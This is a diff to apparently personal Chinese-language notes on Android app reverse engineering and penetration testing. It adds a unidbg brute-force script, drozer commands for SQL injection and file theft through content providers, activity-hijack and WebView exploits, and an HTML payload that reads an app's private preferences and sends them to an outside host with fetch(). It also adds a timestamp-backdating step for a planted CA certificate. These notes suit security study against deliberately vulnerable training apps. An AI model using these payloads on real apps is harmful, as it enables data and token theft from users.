@@ -38,6 +38,7 @@ adb push 9a5ba575.0 /sdcard/
 adb shell
 z2_plus:/ # mv /sdcard/9a5ba575.0 /system/etc/security/cacerts/
 z2_plus:/ # chmod 644 /system/etc/security/cacerts/9a5ba575.0
+z2_plus:/ # touch -t 200901010800 /system/etc/security/cacerts/9a5ba575.0
 z2_plus:/ # reboot
 ```
 
@@ -132,11 +133,6 @@ apksigner sign --ks my-release-key.jks --ks-pass pass:123456 --out demoapp2-fina
 # GUI工具
 # https://qwertycube.com/apk-editor-studio/
 ```
-
-### 破解思路
-
-1. 错误提示信息是关键，通常属于字符串资源，可能硬编码，也可能引用自 `res/values/strings.xml` 文件，其中的内容在打包时会进入 `resources.arsc` 文件。如果反编译成功，就能被解密出来。以 `abc_` 开头的字符串是系统默认生成的，其它都是程序中使用的字符串。搜索错误提示，可以看到其对应的 `name`  ，再搜索 `name` 可以在 `public.xml` 中找到其对应的 `id` ，再搜索其 `id` ，看看是否出现在 `smali` 代码中。
-
 
 ### 动态调试
 
@@ -663,6 +659,10 @@ JNIEXPORT jint JNI_OnLoad(JavaVM* vm, void* reserved) {
     return JNI_VERSION_1_6;
 }
 ```
+
+### 破解思路
+
+1. 错误提示信息是关键，通常属于字符串资源，可能硬编码，也可能引用自 `res/values/strings.xml` 文件，其中的内容在打包时会进入 `resources.arsc` 文件。如果反编译成功，就能被解密出来。以 `abc_` 开头的字符串是系统默认生成的，其它都是程序中使用的字符串。搜索错误提示，可以看到其对应的 `name`  ，再搜索 `name` 可以在 `public.xml` 中找到其对应的 `id` ，再搜索其 `id` ，看看是否出现在 `smali` 代码中。
 
 ### 日志插桩
 
@@ -2389,4 +2389,237 @@ public class MainActivity extends AbstractJni {
     }
 }
 
+```
+
+#### 通过安装包运行案例
+
+```java
+package com.roysue.solov;  
+  
+import com.github.unidbg.AndroidEmulator;  
+import com.github.unidbg.Module;  
+import com.github.unidbg.linux.android.AndroidEmulatorBuilder;  
+import com.github.unidbg.linux.android.AndroidResolver;  
+import com.github.unidbg.linux.android.dvm.*;  
+import com.github.unidbg.memory.Memory;  
+  
+import java.io.File;  
+  
+public class MainActivity2 extends AbstractJni {  
+  
+    public static void main(String[] args) {  
+        long start = System.currentTimeMillis();  
+        com.roysue.solov.MainActivity2 mainActivity = new com.roysue.solov.MainActivity2();  
+        System.out.println("load offset=" + (System.currentTimeMillis() - start) + "ms");  
+        mainActivity.crack();  
+    }  
+  
+    private final AndroidEmulator emulator;  
+    private final VM vm;  
+    private final String thizName = "com.roysue.r1zapatandk.MainActivity";  
+    private final DvmClass dvmClass;  
+  
+    private MainActivity2() {  
+        emulator = AndroidEmulatorBuilder.for32Bit().build();  
+        Memory memory = emulator.getMemory();  
+        memory.setLibraryResolver(new AndroidResolver(23));  
+        vm = emulator.createDalvikVM(new File("unidbg-android/src/test/resources/apks/r1zapatandk.apk"));  
+        vm.setVerbose(false);  
+        DalvikModule dalvikModule = vm.loadLibrary("native-lib", false);  
+        vm.setJni(this);  
+        Module module = dalvikModule.getModule();  
+        vm.callJNI_OnLoad(emulator, module);  
+        dvmClass = vm.resolveClass(thizName);  
+    }  
+  
+    private void crack() {  
+        for (int i = 234560; i < 999999; i++) {  
+            DvmObject res = dvmClass.callStaticJniMethodObject(  
+                    emulator,  
+                    "Sign(Ljava/lang/String;)Ljava/lang/String;",  
+                    new String(i + "")  
+            );  
+            if (res.getValue().toString().equals("508df4cb2f4d8f80519256258cfb975f")) {  
+                System.out.println("[*] bingo: " + i);  
+                break;            }  
+        }  
+    }  
+}
+```
+
+### 客户端漏洞
+
+#### 四大组件漏洞
+
+- 启动
+
+```bash
+adb forward tcp:31415 tcp:31415
+# drozer console connect --server HOST[:PORT]
+drozer console connect --server 127.0.0.1
+```
+
+- 列举可用模块
+
+```
+list
+```
+
+- 查看指定模块如何运行
+
+```
+run <MODULE> --help
+
+help <MODULE>
+```
+
+- 通过包名搜索应用
+
+```
+run app.package.list -f zhang3
+```
+
+- 获取指定应用的基本信息
+
+```
+run app.package.info -a com.withsecure.example.sieve
+```
+
+- 获取指定应用暴露的攻击面
+
+```
+run app.package.attacksurface com.withsecure.example.sieve
+```
+
+- 获取指定应用导出的Activity信息
+
+```
+run app.activity.info -a com.withsecure.example.sieve
+```
+
+- 启动指定应用的指定Activity
+
+```
+run app.activity.start --component com.withsecure.example.sieve com.withsecure.example.sieve.activity.PWList
+```
+
+- 获取指定应用导出的Content Provider信息
+
+```
+run app.provider.info -a com.withsecure.example.sieve
+```
+
+- 获取指定应用导出的Content Provider相关的URI
+
+```
+run scanner.provider.finduris -a com.withsecure.example.sieve
+```
+
+- 向指定Content Provider URI发送查询请求
+
+```
+run app.provider.query content://com.withsecure.example.sieve.provider.DBContentProvider/Passwords/
+
+# SQL 注入测试
+run app.provider.query content://com.withsecure.example.sieve.provider.DBContentProvider/Passwords/ --projection "'"
+run app.provider.query content://com.withsecure.example.sieve.provider.DBContentProvider/Passwords/ --selection "'"
+run app.provider.query content://com.withsecure.example.sieve.provider.DBContentProvider/Passwords/ --projection "* from key;--"
+```
+
+- 自动测试指定应用的Content Provider是否存在SQL注入漏洞
+
+```
+run scanner.provider.injection -a com.withsecure.example.sieve
+```
+
+- 当Content Provider支持文件操作时 可以通过它读写文件系统
+
+```
+run app.provider.read content://com.withsecure.example.sieve.provider.FileBackupProvider/etc/hosts
+run app.provider.download content://com.withsecure.example.sieve.provider.FileBackupProvider/data/data/com.withsecure.example.sieve/databases/database.db drozer/sieve.db
+```
+
+- 获取指定应用导出的Service信息
+
+```
+run app.service.info -a com.withsecure.example.sieve
+```
+
+- 向指定Service发送消息
+
+```
+run app.service.send com.withsecure.example.sieve com.withsecure.example.sieve.service.CryptoService --msg 13476 0 0 --extra string com.withsecure.example.sieve.KEY 0123456789abcdef --extra bytearray com.withsecure.example.sieve.PASSWORD base64(V1RVRhcRAxQSHw==) --bundle-as-obj
+```
+
+#### 其它
+
+- 页面劫持
+
+```bash
+adb shell am start -n com.zhang3.myapp/.TransparentActivity
+```
+
+- 防截屏/录屏检测
+
+```bash
+adb shell screencap /sdcard/Download/hijack.png
+```
+
+#### WebView漏洞
+
+- WebView漏洞
+
+```bash
+# 导出的WebView利用
+# 导出的Activity 其中引入了android.webkit.WebView
+# 案例：WebView劫持
+adb shell am start -n <componentname> --es [key] [value]
+adb shell am start -n com.tmh.vulnwebview/.RegistrationWebView --es reg_url "https://m.weibo.cn"
+
+# 启用了setAllowUniversalAccessFromFileURLs
+# 或 setAllowFileAccessFromFileURLs
+# 此设置删除了所有同源策略限制 允许webview向本地文件发出web请求
+# 案例：文件窃取、XSS
+adb push affu.html /sdcard/Download/
+adb shell am start -n com.tmh.vulnwebview/.RegistrationWebView --es reg_url "file:///sdcard/Download/affu.html"
+
+# 启用了JavaScript接口
+# webView.addJavascriptInterface(new WebAppInterface(this), "Android"); // 这里是Android
+# 案例：RCE（令牌窃取）、XSS
+adb shell am start -n com.tmh.vulnwebview/.Supportwebview --es support_url "https://local.zhang3.cn:7331/jsi.html"
+```
+
+上述利用中用到的本地恶意网页`affu.html`内容为
+
+```html
+<script>
+    const url = 'file:///data/data/com.tmh.vulnwebview/shared_prefs/MainActivity.xml'; // 读取应用本地文件内容
+    function load(url) {
+        var xhr = new XMLHttpRequest();
+        xhr.onreadystatechange = function () {
+            if (xhr.readyState === 4) {
+                // 发送文件内容到服务器上
+                // 这里需要用到HTTPS和域名
+                fetch('https://local.zhang3.cn:7331/?data=' + btoa(xhr.responseText));
+            }
+        }
+        xhr.open('GET', url, true);
+        xhr.send('');
+    }
+    load(url);
+</script>
+```
+
+需要用域名 暂时简单弹一个XSS PoC代替吧
+
+```html
+<ScRIpt>prompt`3334444`</sCriPT>
+```
+
+WebView JS接口调用Java代码示例 `jsi.html` 内容为 需要将它放到HTTPS服务器上才能用
+
+```html
+<script type="text/javascript">
+document.write("token: " + Android.getUserToken());
+</script>
 ```
